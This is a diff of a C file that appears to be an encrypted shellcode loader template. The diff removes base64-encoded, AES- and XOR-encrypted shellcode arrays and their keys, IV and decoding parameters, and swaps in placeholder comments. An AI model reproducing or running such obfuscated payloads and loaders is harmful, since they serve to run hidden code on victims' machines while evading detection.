@@ -9,13 +9,13 @@
 #include <time.h>
 
 /* copy paste scrypt output here */
-unsigned char shellcode[] = { "XHgxYVx4ODlceDFhXHg4OFx4N2JceGI2XHhmNFx4N2FceGNlXHhmNlx4MzVceDQ1XHhkOVx4NDNceDNiXHhiMFx4NDdceDZmXHg2NVx4NzdceDdmXHhkOFx4MDhceDk5XHg1N1x4NjlceDM5XHhiMFx4OGJceGZmXHhjZVx4NmRceDNhXHg1OFx4YTFceGRkXHhiYVx4ZmNceDkxXHhkMVx4ZGJceGI4XHg0ZVx4ZDBceDZiXHg4Mlx4MDJceDQyXHgwNFx4OGFceGQxXHhjYVx4MWJceDQ4XHhlY1x4OWNceGE3XHhjZlx4NDdceDdjXHg5NFx4ZmRceDZhXHhkZlx4N2FceGZjXHgzMFx4ZjRceDdmXHhmNFx4M2RceDNlXHgyMVx4OGJceDMyXHg5NVx4YmJceDgyXHg1ZVx4OTc=" };
-unsigned char aeskey[] = { "XHhlZlx4MGRceGFjXHgxYlx4OGVceGU0XHhlZVx4YjdceDA5XHg0Zlx4M2FceDg2XHg4OVx4OGZceDZkXHg2YVx4YTlceDg2XHg5ZFx4NDdceDZjXHgwMlx4ZWJceDRjXHhmZFx4YTJceGQwXHgxZVx4M2RceDE4XHg0OVx4NzhceGY5XHhkZFx4MTZceDE0XHgwOFx4ZTBceDJlXHg1Y1x4MmVceGNmXHg1Nlx4ZDhceDE5XHg5N1x4MWJceDUxXHhjMFx4ZWRceGI1XHhmNFx4MmRceDkyXHg0Ylx4MDRceGQ0XHg5Y1x4NTJceDRhXHg0YVx4YjlceGQxXHg4NQ==" };
-unsigned char iv[] = { "XHg3M1x4NWFceDcyXHg1YVx4NjRceDNlXHgyN1x4ZDhceDBlXHgxN1x4MmNceDQzXHhjNVx4NzVceDYzXHhiYw==" };
-unsigned char xorkey[] = { "XHg3MFx4ZWJceDcxXHhiZVx4Y2FceGFlXHg5Ylx4ZTdceDMwXHhiMVx4OGZceDVlXHhjNVx4MmRceDNhXHgwM1x4YTFceGFkXHhlY1x4NTlceGI1XHg1Zlx4NTZceDc2XHg1Ylx4NTdceDBmXHhlNFx4NmRceDQ2XHhiYVx4ZGRceDMxXHgyY1x4OWJceGZjXHhkYVx4MzdceGUzXHgwYVx4ZThceDcyXHg2OFx4YWRceDlmXHhhM1x4YjBceDQwXHg1MFx4OWNceDlhXHgwNVx4ZmJceGYwXHg3Ylx4NTdceDQ3XHg4Ylx4M2JceGI0XHhkMVx4ZjVceDkyXHgwM1x4MjFceDJkXHhmZg==" };
-int rot = 0;
-int dec = 214;
-int iterations = 12;
+unsigned char shellcode[] = {/* shellcode */};
+unsigned char aeskey[] = {/* aes key */};
+unsigned char iv[] = {/* aes iv */};
+unsigned char xorkey[] = {/* xor key */};
+int rot = /* rotation value */;
+int dec = /* dec value*/;
+int iterations = /* iterations value */;
 /* ------------------ */
 
 const char *RED = "\033[01;31m";
